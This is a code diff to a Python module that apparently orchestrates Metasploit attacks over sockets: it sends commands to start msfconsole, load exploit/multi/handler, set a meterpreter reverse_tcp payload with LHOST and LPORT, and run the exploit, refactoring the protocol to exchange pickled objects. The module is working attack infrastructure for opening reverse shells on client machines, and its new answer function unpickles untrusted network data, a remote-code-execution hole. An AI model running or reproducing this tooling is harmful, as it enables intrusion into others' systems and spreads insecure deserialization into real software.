@@ -1,5 +1,7 @@
 import select
 import uuid
+from Data.data import Data
+import pickle
 
 def find_socket(ip: str):
     from Service.exploit_socket import client_sockets
@@ -7,44 +9,37 @@ def find_socket(ip: str):
         return True
     return False
 
+def conversation(socket, data: Data, expected_answer: str):
+    socket.sendall(pickle.dumps(data))
+    response = answer(socket)
+    if response != expected_answer:
+        print(f"Error: Expected {expected_answer} but got {response}.")
+        return False
+    return True
+
+def conversation_with_exploit_info(socket, data: Data):
+    socket.sendall(pickle.dumps(data))
+    return answer(socket)
+
 def exploit_start(ip: str, port:int, client_ip: str, payload: str):
     from Service.exploit_socket import client_sockets
     socket = client_sockets.get(ip)
-    
-    socket.sendall(b"Port:" + str(port).encode() + b"\n")
-    if not answer(socket):
-        print("Error while sending the port.")
-        return False
-    socket.sendall(b"Screen:metasploit_" + ip.encode() + b"_" + str(uuid.uuid4()).encode()+b"\n")
-    if not answer(socket):
-        print("Error while sending the exploit command.")
-        return False
-    socket.sendall(b"Command:msfconsole")
-    if not answer(socket):
-        print("Error while sending the msfconsole command.")
-        return False
-    socket.sendall(b"openpty")
-    socket.sendall(b"Command:use exploit/multi/handler")
-    if not answer(socket):
-        print("Error while sending the use command.")
-        return False
-    socket.sendall(b"Command:set payload python/meterpreter/reverse_tcp")
-    if not answer(socket):
-        print("Error while sending the set payload command.")
-        return False
-    socket.sendall(b"Command:set LHOST 0.0.0.0")
-    if not answer(socket):
-        print("Error while sending the set LHOST command.")
-        return False
-    socket.sendall(b"Command:set LPORT " + str(port).encode())
-    if not answer(socket):
-        print("Error while sending the set LPORT command.")
-        return False
-    socket.sendall(b"Command:exploit")
-    if not answer(socket):
-        print("Error while sending the exploit command.")
-        return False
-    socket.sendall(b"EXPLOIT")
+    conversation(socket, Data("Info", f"Payload request received from {client_ip}."), "OK")
+    conversation(socket, Data("Info", "Start opening reverse_tcp session."), "OK")
+    if answer := conversation_with_exploit_info(socket, Data("Exploit Info", f"Payload: {payload}\\IP: {client_ip}\\Port: {port}")):
+        if answer == "Exist":
+            print("Session already exists.")
+            return True
+        elif "Port" in answer:
+            port = answer.split(":")[1].strip()
+    conversation(socket, Data("Screen", "metasploit_" + ip + "_" + str(uuid.uuid4())), "OK")
+    conversation(socket, Data("Command", "msfconsole"), "OK")
+    conversation(socket, Data("Command", "use exploit/multi/handler"), "OK")
+    conversation(socket, Data("Command", "set PAYLOAD " + payload), "OK")
+    conversation(socket, Data("Command", "set LHOST 0.0.0.0"), "OK")
+    conversation(socket, Data("Command", "set LPORT " + str(port)), "OK")
+    conversation(socket, Data("Command", "exploit"), "OK")
+    conversation(socket, Data("EXPLOIT", f"Payload:{payload}"), "OK")
     return True
 
 def answer(socket):
@@ -54,8 +49,7 @@ def answer(socket):
             data = socket.recv(1024)
             if not data:
                 break
-            print(f"Client: {data.decode()}")
-            if "OK" in data.decode():
-                break
-    return True
+            data = pickle.loads(data)
+            return data.content
+    return None
 
